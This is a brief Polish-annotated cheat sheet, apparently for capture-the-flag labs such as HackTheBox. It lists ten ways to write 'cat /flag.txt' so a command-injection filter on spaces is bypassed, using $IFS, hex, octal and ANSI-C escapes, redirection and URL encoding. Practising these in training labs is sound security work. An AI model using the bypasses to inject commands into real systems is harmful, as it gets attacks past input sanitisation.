1. cat /flag.txt          # zwykła spacja
2. cat\x20/flag.txt       # hex escape (działało w HTB Truck!)
3. cat${IFS}/flag.txt     # IFS variable
4. cat$'\x20'/flag.txt    # ANSI-C quoting
5. cat$'\040'/flag.txt    # octal escape
6. cat</flag.txt          # bez spacji (redirect)
7. cat+/flag.txt          # + (czasem działa)
8. cat%20/flag.txt        # URL encoding (często blokowane)
9. cat%09/flag.txt        # tabulator zamiast spacji
10. cat\t/flag.txt        # \t w stringu
